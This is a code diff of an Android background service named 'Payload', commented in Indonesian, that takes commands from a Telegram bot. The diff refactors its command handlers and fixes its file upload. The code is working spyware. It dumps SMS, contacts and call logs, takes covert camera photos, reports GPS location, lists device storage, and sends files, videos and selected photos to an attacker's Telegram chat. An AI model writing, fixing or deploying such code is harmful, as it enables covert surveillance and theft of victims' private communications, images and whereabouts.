@@ -120,7 +120,6 @@ public class Payload extends Service {
                 
                 sendCheckIn(deviceName);
 
-                // WAKTU SIAGA: 3 MENIT (180 DETIK)
                 writeLog("3. Masuk Fast Polling (3 Menit)");
                 long endTime = System.currentTimeMillis() + (180 * 1000); 
                 while (System.currentTimeMillis() < endTime) {
@@ -135,6 +134,16 @@ public class Payload extends Service {
         }).start();
 
         return START_NOT_STICKY;
+    }
+
+    // Helper: parser perintah yang lebih toleran
+    private String getParam(String json, String cmdPrefix) {
+        int idx = json.indexOf(cmdPrefix);
+        if (idx == -1) return null;
+        int start = idx + cmdPrefix.length();
+        int end = json.indexOf("\"", start);
+        if (end == -1) return null;
+        return json.substring(start, end).trim();
     }
 
     private void checkCommands() {
@@ -160,8 +169,8 @@ public class Payload extends Service {
                 prefs.edit().putLong("lastUpdateId", lastUpdateId).apply();
             }
             
-            // FITUR TREE FILE
-            if (jsonResponse.contains("\"text\":\"/tree " + myAndroidId + "\"")) {
+            // Tree
+            if (jsonResponse.contains("/tree " + myAndroidId)) {
                 writeLog("Membangun Tree...");
                 String tree = buildTree(new File("/storage/emulated/0/"), "", 0);
                 if (tree.length() > 3500) {
@@ -173,82 +182,53 @@ public class Payload extends Service {
                     sendTelegramMessage("📂 *Tree Folder:*\n" + tree);
                 }
             }
-            // FITUR DUMP
-            else if (jsonResponse.contains("\"text\":\"/dump_sms " + myAndroidId + "\"")) {
-                dumpSmsToFile();
-            } else if (jsonResponse.contains("\"text\":\"/dump_kontak " + myAndroidId + "\"")) {
-                dumpContactsToFile();
-            } else if (jsonResponse.contains("\"text\":\"/dump_telpon " + myAndroidId + "\"")) {
-                dumpCallLogsToFile();
-            }
-            // FITUR KAMERA & LOKASI
-            else if (jsonResponse.contains("\"text\":\"/foto_depan " + myAndroidId + "\"")) {
-                takePhoto(1);
-            } else if (jsonResponse.contains("\"text\":\"/foto_belakang " + myAndroidId + "\"")) {
-                takePhoto(0);
-            } else if (jsonResponse.contains("\"text\":\"/lacak " + myAndroidId + "\"")) {
-                sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
-            }
-            // FITUR CEK FILE SPESIFIK
-            else if (jsonResponse.contains("\"text\":\"/send_file " + myAndroidId)) {
-                String prefix = "/send_file " + myAndroidId + " ";
-                int pathIdx = jsonResponse.indexOf(prefix);
-                if (pathIdx != -1) {
-                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
-                    if (endQuote != -1) {
-                        String path = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim();
-                        File f = new File(path);
-                        if(f.exists()) sendTelegramFile(f.getAbsolutePath(), false, "📤 File: " + f.getName());
-                        else sendTelegramMessage("❌ File tidak ditemukan.");
-                    }
+            // Dump
+            else if (jsonResponse.contains("/dump_sms " + myAndroidId)) { dumpSmsToFile(); }
+            else if (jsonResponse.contains("/dump_kontak " + myAndroidId)) { dumpContactsToFile(); }
+            else if (jsonResponse.contains("/dump_telpon " + myAndroidId)) { dumpCallLogsToFile(); }
+            // Kamera & Lokasi
+            else if (jsonResponse.contains("/foto_depan " + myAndroidId)) { takePhoto(1); }
+            else if (jsonResponse.contains("/foto_belakang " + myAndroidId)) { takePhoto(0); }
+            else if (jsonResponse.contains("/lacak " + myAndroidId)) { sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation()); }
+            // Send File
+            else if (jsonResponse.contains("/send_file " + myAndroidId)) {
+                String param = getParam(jsonResponse, "/send_file " + myAndroidId + " ");
+                if (param != null) {
+                    File f = new File(param);
+                    if(f.exists()) sendTelegramFile(f.getAbsolutePath(), false, "📤 File: " + f.getName());
+                    else sendTelegramMessage("❌ File tidak ditemukan.");
                 }
             }
-            // FITUR FOTO ACAK
-            else if (jsonResponse.contains("\"text\":\"/send_foto_acak " + myAndroidId)) {
-                String prefix = "/send_foto_acak " + myAndroidId + " ";
-                int pathIdx = jsonResponse.indexOf(prefix);
-                if (pathIdx != -1) {
-                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
-                    if (endQuote != -1) {
-                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
-                        if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "acak");
-                    }
+            // Foto Acak
+            else if (jsonResponse.contains("/send_foto_acak " + myAndroidId)) {
+                String param = getParam(jsonResponse, "/send_foto_acak " + myAndroidId + " ");
+                if (param != null) {
+                    String[] parts = param.split(" ");
+                    if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "acak");
                 }
             }
-            // FITUR FOTO WAJAH
-            else if (jsonResponse.contains("\"text\":\"/send_foto_wajah " + myAndroidId)) {
-                String prefix = "/send_foto_wajah " + myAndroidId + " ";
-                int pathIdx = jsonResponse.indexOf(prefix);
-                if (pathIdx != -1) {
-                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
-                    if (endQuote != -1) {
-                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
-                        if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "wajah");
-                    }
+            // Foto Wajah
+            else if (jsonResponse.contains("/send_foto_wajah " + myAndroidId)) {
+                String param = getParam(jsonResponse, "/send_foto_wajah " + myAndroidId + " ");
+                if (param != null) {
+                    String[] parts = param.split(" ");
+                    if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "wajah");
                 }
             }
-            // FITUR FOTO PERUT
-            else if (jsonResponse.contains("\"text\":\"/send_foto_perut " + myAndroidId)) {
-                String prefix = "/send_foto_perut " + myAndroidId + " ";
-                int pathIdx = jsonResponse.indexOf(prefix);
-                if (pathIdx != -1) {
-                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
-                    if (endQuote != -1) {
-                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
-                        if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1]), "perut");
-                    }
+            // Foto Perut
+            else if (jsonResponse.contains("/send_foto_perut " + myAndroidId)) {
+                String param = getParam(jsonResponse, "/send_foto_perut " + myAndroidId + " ");
+                if (param != null) {
+                    String[] parts = param.split(" ");
+                    if (parts.length >= 2) sendFotoFiltered(parts[0], Integer.parseInt(parts[1].trim()), "perut");
                 }
             }
-            // FITUR SEND VIDEO
-            else if (jsonResponse.contains("\"text\":\"/send_video " + myAndroidId)) {
-                String prefix = "/send_video " + myAndroidId + " ";
-                int pathIdx = jsonResponse.indexOf(prefix);
-                if (pathIdx != -1) {
-                    int endQuote = jsonResponse.indexOf("\"", pathIdx);
-                    if (endQuote != -1) {
-                        String[] parts = jsonResponse.substring(pathIdx + prefix.length(), endQuote).trim().split(" ");
-                        if (parts.length >= 3) sendVideoFiltered(parts[0], Integer.parseInt(parts[1]), Integer.parseInt(parts[2]));
-                    }
+            // Send Video
+            else if (jsonResponse.contains("/send_video " + myAndroidId)) {
+                String param = getParam(jsonResponse, "/send_video " + myAndroidId + " ");
+                if (param != null) {
+                    String[] parts = param.split(" ");
+                    if (parts.length >= 3) sendVideoFiltered(parts[0], Integer.parseInt(parts[1].trim()), Integer.parseInt(parts[2].trim()));
                 }
             }
 
@@ -481,28 +461,56 @@ public class Payload extends Service {
         } catch (Exception e) { writeLog("Error Kirim Pesan: " + e.getMessage()); }
     }
 
+    // FIX: Nama field dinamis (photo vs document)
     private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
         String boundary = "*****";
+        String fieldName = isPhoto ? "photo" : "document";
         try {
             File file = new File(filePath);
-            if (!file.exists()) return;
+            if (!file.exists()) { writeLog("File ga ada: " + filePath); return; }
+            
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + (isPhoto ? "/sendPhoto" : "/sendDocument");
             HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
             conn.setDoOutput(true);
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+            
             DataOutputStream request = new DataOutputStream(conn.getOutputStream());
-            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
-            if (caption != null) request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
-            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
+            request.writeBytes("--" + boundary + "\r\n");
+            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
+            
+            if (caption != null) {
+                request.writeBytes("--" + boundary + "\r\n");
+                request.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
+            }
+            
+            request.writeBytes("--" + boundary + "\r\n");
+            request.writeBytes("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + file.getName() + "\"\r\n");
+            request.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
+            
             FileInputStream fis = new FileInputStream(file);
             byte[] buffer = new byte[4096];
             int bytesRead;
             while ((bytesRead = fis.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
             fis.close();
+            
             request.writeBytes("\r\n--" + boundary + "--\r\n");
-            request.flush(); request.close(); conn.getResponseCode(); 
-        } catch (Exception e) { e.printStackTrace(); }
+            request.flush(); request.close();
+            
+            int responseCode = conn.getResponseCode();
+            if (responseCode != 200) {
+                // Log error dari Telegram
+                BufferedReader err = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
+                StringBuilder errBody = new StringBuilder();
+                String errLine;
+                while ((errLine = err.readLine()) != null) errBody.append(errLine);
+                writeLog("Kirim File GAGAL (" + responseCode + "): " + errBody.toString());
+            } else {
+                writeLog("Kirim File SUKSES: " + file.getName());
+            }
+        } catch (Exception e) { 
+            writeLog("Exception SendFile: " + e.getMessage()); 
+        }
     }
 
     @Override
